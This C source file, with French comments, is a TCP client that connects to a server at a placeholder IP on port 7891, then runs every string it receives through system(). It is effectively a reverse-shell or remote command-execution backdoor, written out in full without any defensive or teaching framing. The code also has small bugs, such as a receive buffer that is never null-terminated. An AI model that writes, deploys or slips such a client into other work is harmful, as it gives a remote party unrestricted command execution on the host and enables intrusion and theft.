#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
char buffer[1024];

int executeCommand(const char *command) {
    int ret = system(command);
    
    if (ret == -1) {
        perror("Erreur lors de l'exécution de la commande");
        return 1; // Retourne 1 en cas d'erreur
    }

    return 0; // Retourne 0 si la commande est exécutée avec succès
}

int main(){
    int clientSocket;
    struct sockaddr_in serverAddr;
    socklen_t addr_size;

    printf("Initialisation du client...\n");

    clientSocket = socket(PF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(7891);
    serverAddr.sin_addr.s_addr = inet_addr("Adresse IP du serveur");
    memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);

    printf("Tentative de connexion au serveur...\n");
    addr_size = sizeof serverAddr;
    connect(clientSocket, (struct sockaddr *) &serverAddr, addr_size);

    printf("Connecté au serveur. Envoi d'un message...\n");
    const char *initialMessage = "Hello Server!";
    send(clientSocket, initialMessage, strlen(initialMessage), 0);


    // Boucle pour recevoir des messages en continu du serveur
    while(1){
        printf("En attente de reception de mesage");
        int bytesRead = recv(clientSocket, buffer, 1024, 0);
        if (bytesRead <= 0){
            break; // Sortir de la boucle si la connexion est perdue
        }
        printf("Commande execute par serveur: %s\\n", buffer);
        executeCommand(buffer);
    }

    printf("Fermeture du client.\n");
    close(clientSocket);

    return 0;
}
